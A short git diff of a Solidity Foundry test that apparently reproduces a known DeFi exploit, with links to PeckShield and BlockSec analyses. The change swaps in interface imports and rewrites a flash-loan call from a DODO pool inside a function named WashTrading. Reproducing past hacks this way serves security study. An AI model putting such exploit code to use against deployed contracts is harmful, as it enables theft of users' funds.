@@ -3,6 +3,9 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IDVM} from "src/interfaces/IDVM.sol";
 // @Analysis
 // https://twitter.com/peckshield/status/1653149493133729794
 // https://twitter.com/BlockSecTeam/status/1653267431127920641
@@ -93,7 +96,7 @@ contract ContractTest is Test {
     }
 
     function WashTrading() internal {
-        DVM(dodo).flashLoan(300 * 1e18, 0, address(this), abi.encode(uint256(20)));
+        IDVM(dodo).flashLoan(300 * 1e18, 0, address(this), abi.encode(uint256(20)));
     }
 
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
